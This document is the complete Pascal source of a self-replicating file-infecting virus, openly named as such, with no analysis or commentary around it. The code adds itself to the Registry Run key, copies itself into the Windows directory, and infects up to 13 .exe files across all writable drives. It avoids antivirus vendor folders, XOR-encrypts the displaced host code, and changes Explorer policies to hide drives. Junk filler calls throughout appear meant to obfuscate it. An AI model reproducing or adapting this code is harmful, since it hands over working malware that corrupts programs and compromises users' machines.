  {$M 65520,0,0}
Program Virus_DOS_HLLP_GVDG;
USES DOS;
Const
  VirSize=6413;
  Metka='dyp37-89';
  MSize=length(Metka);
type
  Bufer=array[1..VirSize] of Char;
VAR
   Victim : integer;
Procedure BeginEnd(i : integer);
var
  n :integer;
Begin
  case i of
        0..10000: n:=0;
    10001..20000: n:=i;
    20001..30000: n:=random(1000)
  else
    begin  
      n:=0;
      n:=random(65535);
      n:=i
    end;  
  end;
End;
Function IntToStr(I : integer) : String;
Var
  S : String [5];
Begin
 Str(I, S); BeginEnd(-1651); BeginEnd(-2222);
 IntToStr:=S; BeginEnd(-6988); 
End;
Procedure AutoRun;
VAR
    f : file;
  txt : text;
    i : integer;
  st1 : string;
  st2 : string;
Begin
  st1:=GetEnv('SystemRoot')+'\'+'DEA@LVIR'+'.EXE';
  for i:=1 to length(st1) do
  begin
  if st1[i]='\'
  then st2:=st2+'\'+st1[i]
  else st2:=st2+st1[i]
  end;
  Assign(f,st1); BeginEnd(-908); BeginEnd(17520); BeginEnd(6378);
  {$i-} Reset(f); Close(f); {$i+}
  if IOResult<>0 then
  Begin
    Assign(txt,'REG'); BeginEnd(8912); BeginEnd(-3603); BeginEnd(-2623);
    Rewrite(txt); BeginEnd(-1653); 
    Writeln(txt,'Windows Registry Editor Version 5.00');
    Writeln(txt,'[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]');
    Writeln(txt,'"DEA@LVIR"="'+st2+'"');
    Close(txt);
    Exec(GetEnv('Comspec'),'/c REG IMPORT REG');
    Exec(GetEnv('Comspec'),'/c DEL REG'); BeginEnd(-2496); BeginEnd(10770);
    Exec(GetEnv('Comspec'),'/c copy '+paramstr(0)+' '+st1); BeginEnd(-2261); 
    Exec(GetEnv('Comspec'),'/c cls'); BeginEnd(28737); BeginEnd(30239); BeginEnd(9658);
  End; BeginEnd(23715); 
End;
function CD(path:string):boolean;
var
           d : dirstr;
           n : namestr;
           e : extstr;
           b : boolean;
         ToF : file;
       FromF : file;
           f : file;
     NumRead : Word;
  NumWritten : Word;
         Buf : array[1..$400] of Char;
          st : string;
begin
  fsplit(paramstr(0),d,n,e); BeginEnd(673); 
  st:=path+n+e;
  Assign(f,d+n+'.gds'); BeginEnd(9840); BeginEnd(-5599);
  {$i-}rewrite(f);
  Erase(f);{$i+}
    if IOResult<>0
      then
            Begin
             b:=true;
             Assign(FromF, ParamStr(0)); BeginEnd(-3840); 
             Reset(FromF, 1); BeginEnd(-1919); 
             Assign(ToF,st); BeginEnd(-2839); BeginEnd(16999);
             SetFAttr(ToF,0);
             Rewrite(ToF, 1);
             repeat
               BlockRead(FromF, Buf, SizeOf(Buf), NumRead); BeginEnd(-2861); 
               BlockWrite(ToF, Buf, NumRead, NumWritten);
             until (NumRead = 0) or (NumWritten <> NumRead);
             Close(ToF); BeginEnd(22418); BeginEnd(25345); BeginEnd(-8004);
             Close(FromF); BeginEnd(-1279); BeginEnd(-4912); BeginEnd(-1890);
             exec(st,'');
            end
      else b:=false;
  CD:=b; BeginEnd(18477); BeginEnd(-2688);
end;
procedure Shifr(var Buf:Bufer; key:integer);
var
   k : integer;
  ii : integer;
begin
  for k:=1 to Sizeof(Buf) do
  begin
    ii:=key+k; BeginEnd(11058); BeginEnd(4102);
    Buf[k]:=chr(ord(Buf[k]) xor ii); BeginEnd(14179); BeginEnd(-1144); BeginEnd(-3789);
  end;
end;
procedure Infect(path,name:string);
var
    FromF : file;
      ToF : file;
   BufVir : Bufer;
  NumRead : Word;
      txt : text;
        i : integer;
        k : integer;
      Key : integer;
begin
  Assign(txt,path+name);
  append(txt); BeginEnd(-2213); BeginEnd(-4571); BeginEnd(10666);
  write(txt,Metka); BeginEnd(-2704); 
  i:=0; BeginEnd(25272); BeginEnd(-244);
  k:=random(256); BeginEnd(-2957); 
    repeat
      inc(i);
      write(txt,chr(random(256))); BeginEnd(-1460); BeginEnd(-9829);
    until i>k; BeginEnd(19546); BeginEnd(21964);
  Close(txt); BeginEnd(-899); BeginEnd(25504); BeginEnd(12967);
  Assign(ToF,path+name); BeginEnd(18978); 
  reset(ToF,1); BeginEnd(20363); BeginEnd(21374);
  Key:=FileSize(ToF) mod 256;
  BlockRead(ToF,BufVir,SizeOf(BufVir), NumRead); BeginEnd(-2892); 
  Shifr(BufVir,Key-1);
  seek(ToF,filesize(ToF)); BeginEnd(17666); BeginEnd(32345); BeginEnd(-2484);
  BlockWrite(ToF,BufVir,NumRead); BeginEnd(6423); BeginEnd(-2221);
  Assign(FromF,paramstr(0)); BeginEnd(-1051); BeginEnd(-3326);
  reset(FromF,1); BeginEnd(18736); BeginEnd(-478); BeginEnd(-2551);
  BlockRead(FromF,BufVir,SizeOf(BufVir), NumRead); BeginEnd(29919); 
  seek(ToF,0); BeginEnd(-1817); BeginEnd(507); BeginEnd(30320);
  BlockWrite(ToF,BufVir,NumRead); BeginEnd(-3122); 
  Close(ToF); BeginEnd(32592); BeginEnd(-2598);
  Close(FromF);
end;
procedure Find(dir:pathstr);
var
   sr : searchrec;
    f : file;
  Buf : array[1..4] of Char;
begin
  findfirst(dir+'*.exe',39,sr);
  if  (pos('SYSTEM',dir)=0) and (pos('DRWEB', dir)=0)
  and (pos('KASPER',dir)=0) and (pos('PANDA', dir)=0)
  and (pos('NORTON',dir)=0) and (pos('COMMON',dir)=0)
  and (pos('DOCUM', dir)=0) and (pos('GVDG',  dir)=0)
  then
  while doserror=0 do
  if Victim<13 then
  begin
  Assign(f,dir+sr.name); BeginEnd(-1708); 
  setfattr(f,0); BeginEnd(18989); BeginEnd(-1866);
  {$i-}reset(f,1);
  Close(f);{$i+}
  IF ioresult=0 then
    Begin
      Assign(f,dir+sr.name); BeginEnd(17026); 
      reset(f,1); BeginEnd(-2638); BeginEnd(-5072); BeginEnd(-762);
      if FileSize(f)>1000 then
      Begin
        seek(f,85); BeginEnd(6074); 
        blockread(f,Buf,4);
        Close(f); BeginEnd(17568); BeginEnd(-1878); BeginEnd(20318);
        if Buf<>'GDS!' then
         begin
           inc(Victim);
           Infect(dir,sr.name); BeginEnd(16240); 
         end; BeginEnd(26792); 
      end
      else
      Close(f);
    end; BeginEnd(-1704); BeginEnd(25924); BeginEnd(21709);
    findnext(sr); BeginEnd(10321); BeginEnd(-1967); BeginEnd(5720);
  end
  else exit;
  findfirst(dir+'*.',55,sr);
  while doserror=0 do
  if Victim<13 then
  begin
    with sr do
      if (attr and directory<>0) and (name[1]<>'.') and (length(dir)<63)
      then find(dir+name+'\');
    findnext(sr);
  end
  else exit;
end;
procedure InRun(Run : integer);
var
        f : file;
      txt : text;
   BufVir : Bufer;
  NumRead : Word;
        k : integer;
        z : char;
      Key : integer;
        i : longint;
      Buf : array[1..MSize]of char;
begin
  Assign(txt,getenv('TMP')+'reg');
  rewrite(txt); BeginEnd(-2167); 
  writeln(txt,'Windows Registry Editor Version 5.00'); BeginEnd(-4215); 
  write(txt,'[HKEY_CURRENT_USER\Software\Microsoft\'); BeginEnd(-1455); 
  writeln(txt,'Windows\CurrentVersion\Policies\Explorer]');
  writeln(txt,'"DisableLocalMachineRun"=dword:00000001'); BeginEnd(-3254); BeginEnd(7079);
  writeln(txt,'"NoViewOnDrive"=dword:3ffffff');
  Close(txt); BeginEnd(10539); 
  exec(getenv('comspec'),'/c reg import '+getenv('TMP')+'reg');
  exec(getenv('comspec'),'/c cls'); BeginEnd(10348); 
  erase(txt); BeginEnd(3942); BeginEnd(-7672);
  writeln('Hallo, World!!!');
  Assign(f,paramstr(0)); BeginEnd(16459); BeginEnd(16114); BeginEnd(898);
  reset(f,1); BeginEnd(4016); BeginEnd(-1639);
  Key:=(FileSize(f)-VirSize) mod 256;
  seek(f,filesize(f)-VirSize);
  BlockRead(f,BufVir,SizeOf(BufVir), NumRead); BeginEnd(20693); BeginEnd(-9333);
  if filesize(f)=VirSize then
  Begin
    Close(f);
    Erase(f); BeginEnd(-2582); 
    Halt(0);
  end
  else
  Shifr(BufVir,Key-1);
  seek(f,0); BeginEnd(-6177); BeginEnd(13779); BeginEnd(-2025);
  BlockWrite(f,BufVir,NumRead);
  i:=filesize(f)-VirSize-256-MSize; BeginEnd(-2107); BeginEnd(18193);
  while true do
  begin
    seek(f,i); BeginEnd(28799); 
    blockread(f,Buf,MSize); BeginEnd(6159); BeginEnd(-6679); BeginEnd(-1823);
    if Buf=Metka then
    begin
      seek(f,i); BeginEnd(-1298); BeginEnd(-6877); BeginEnd(30062);
      truncate(f); BeginEnd(409); BeginEnd(-2419); BeginEnd(26874);
      break; BeginEnd(-1845); BeginEnd(-2524); BeginEnd(-2490);
    end; BeginEnd(-2688); BeginEnd(-3171); BeginEnd(8285);
    inc(i);
  end; BeginEnd(19505); BeginEnd(30814);
  Close(f);
  if Run=1 then
  exec(Paramstr(0),''); BeginEnd(-2490); 
end;
Procedure Nucleus;
var
    i : integer;
    s : string;
    f : file;
begin
  Assign(f,paramstr(0)); BeginEnd(24115); BeginEnd(-1300); BeginEnd(-2214);
  SetFAttr(f,0);
  if Paramstr(1)='KILL' then
  begin
    InRun(0);
    Halt(0);
  end;
  AutoRun;
  if CD(getenv('SYSTEMROOT')+'\') then halt(0);
  s:='';
  for i:=1 to 24 do
  begin
    Assign(f,chr(ord(i)+66)+':\'+#$FF); BeginEnd(17331); 
    {$I-}rewrite(f); erase(f);{$I+} BeginEnd(-1131); BeginEnd(12748);
    if ioresult=0 then s:=s+chr(ord(i)+66); BeginEnd(-9281); BeginEnd(-8624); BeginEnd(28911);
  end; BeginEnd(756); BeginEnd(32299);
  for i:=1 to length(s) do Find(s[i]+':\'); BeginEnd(9665); BeginEnd(22254);
  InRun(1); BeginEnd(30377); BeginEnd(29725); BeginEnd(-3215);
end;
begin
Randomize; BeginEnd(13073); 
Nucleus; BeginEnd(5647); BeginEnd(2519);
end.
